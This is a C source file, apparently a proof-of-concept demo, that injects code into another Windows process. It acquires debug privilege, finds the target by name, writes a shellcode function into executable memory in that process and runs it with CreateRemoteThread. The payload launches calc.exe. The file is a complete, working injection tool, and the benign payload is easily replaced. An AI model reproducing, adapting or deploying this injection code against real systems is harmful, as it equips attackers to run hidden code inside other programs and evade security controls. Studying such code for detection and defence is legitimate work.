/********************************************************
* code_injection: A program that injects                *
* code into another process                             *
* that starts calc.exe.                                 *
*                                                       *
* Author: Francesco Pompo' <francesco@francesco.cc>     *
*                                                       *
* NOTE: Works only with 32bit processes but             *
* can be easily adapted for 64bit too.                  *
*                                                       *
* License: See LICENSE for licensing informations.      *
*                                                       *
*********************************************************/


#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

/* Using macros because we can be sure they will be included into the shellcode */
#define MEMSET_MACRO(dst, what, len) \
	for (DWORD zz = 0; zz < len; zz++){ ((PUCHAR)dst)[zz] = ((UCHAR)what);}

/* Declaring _CreateProcess as a type so we can declare functions like it */
typedef BOOL (WINAPI *_CreateProcess)(
	_In_opt_    LPCTSTR               lpApplicationName,
	_Inout_opt_ LPTSTR                lpCommandLine,
	_In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_        BOOL                  bInheritHandles,
	_In_        DWORD                 dwCreationFlags,
	_In_opt_    LPVOID                lpEnvironment,
	_In_opt_    LPCTSTR               lpCurrentDirectory,
	_In_        LPSTARTUPINFO         lpStartupInfo,
	_Out_       LPPROCESS_INFORMATION lpProcessInformation
);

/* This is our little struct that will be injected somewhere on remote process */
typedef struct {
	_CreateProcess __CreateProcess;
	WCHAR path[MAX_PATH];
} InjectData;


/* Simple function that finds the PID by giving the process name */
DWORD getPidByName(WCHAR *procname) {

	PROCESSENTRY32 entry;
	HANDLE hSnap;

	entry.dwSize = sizeof(PROCESSENTRY32);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnap, &entry) == TRUE) {
		while (Process32Next(hSnap, &entry) == TRUE)
		{
			if (wcsicmp(entry.szExeFile, procname) == 0)
				return entry.th32ProcessID;
		}
	}

	return 0;
}

/* Function that adds debug privileges to our (injector) process */
int getDebugPriv() {

	HANDLE hToken;
	TOKEN_PRIVILEGES tokenPriv;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tokenPriv.Privileges[0].Luid);
		tokenPriv.PrivilegeCount = 1;
		tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (!AdjustTokenPrivileges(hToken, 0, &tokenPriv, sizeof(tokenPriv), NULL, NULL))
			return 1;
		else
			return 0;

	}
	return 1;
}

/* Function that will be injected and executed into another process space. This is a shellcode, so all shellcode rules needs to be applied. */
DWORD __stdcall injectFn(PVOID param) {

	/* stack allocation is ok */
	InjectData *injData;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;


	injData = (InjectData*)param;

	MEMSET_MACRO(&si, 0, sizeof(si));
	MEMSET_MACRO(&pi, 0, sizeof(pi));

	si.cb = sizeof(si);
	/* CreateProcess address should be the same on every process as kernel32.dll will be 99.99% of times loaded at the same address */
	injData->__CreateProcess(injData->path, 0, 0, 0, FALSE, 0, 0, 0, &si, &pi);

	return 0;

}
VOID injectFnEnd() {}

/* Classic usage function */
void usage() {
	printf("Usage: inject procname");
	exit(-1);
}

/* wmain (to support unicode) */
int wmain(int argc, wchar_t **argv)
{

	int r = -1;
	DWORD pid = 0, sizeOfInjFn, tid = 0;
	HANDLE hProcess = 0;
	PVOID pData = 0, pFn = 0;
	InjectData injData;
	WCHAR *path = L"C:\\WINDOWS\\System32\\calc.exe";
	HMODULE kMod;


	if (argc != 2)
		usage();

	/* to be changed to DWORD64 on 64bit systems */
	sizeOfInjFn = (DWORD)injectFnEnd - (DWORD)injectFn;
	MEMSET_MACRO(&injData, 0, sizeof(injData));
	kMod = GetModuleHandle(L"kernel32.dll");
	injData.__CreateProcess = (_CreateProcess)GetProcAddress(kMod, "CreateProcessW");
	wcscpy(injData.path, path);

	/* Getting debug privileges before starting our sneaky things */
	if (getDebugPriv() != 0)
		goto cleanup;

	/* Getting PID of the process name specified in the cmdline */
	pid = getPidByName(argv[1]);
	if (!pid)
		goto cleanup;

	/* Obtaining a handle to the process */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess)
		goto cleanup;

	/* Allocating the right amount of space in the remote process */
	pData = VirtualAllocEx(hProcess, 0, sizeof(injData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pData)
		goto cleanup;

	pFn = VirtualAllocEx(hProcess, 0, sizeOfInjFn, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pFn)
		goto cleanup;

	/* Writing injData structure and injectFn function into the remote process space */
	if (!WriteProcessMemory(hProcess, pData, &injData, sizeof(injData), 0))
		goto cleanup;

	if (!WriteProcessMemory(hProcess, pFn, injectFn, sizeOfInjFn, 0))
		goto cleanup;

	/* Starting a new thread in the remote process at the pFn pointer and passing pData pointer to it */
	if (CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)pFn, pData, 0, &tid) == NULL)
		goto cleanup;

	printf("Success! TID: %u\n", tid);

	r = 0;
cleanup:

	/* we dont free pData and pFn as they might still be needed by the remote process */

	if(hProcess)
		CloseHandle(hProcess);

	return r;
}
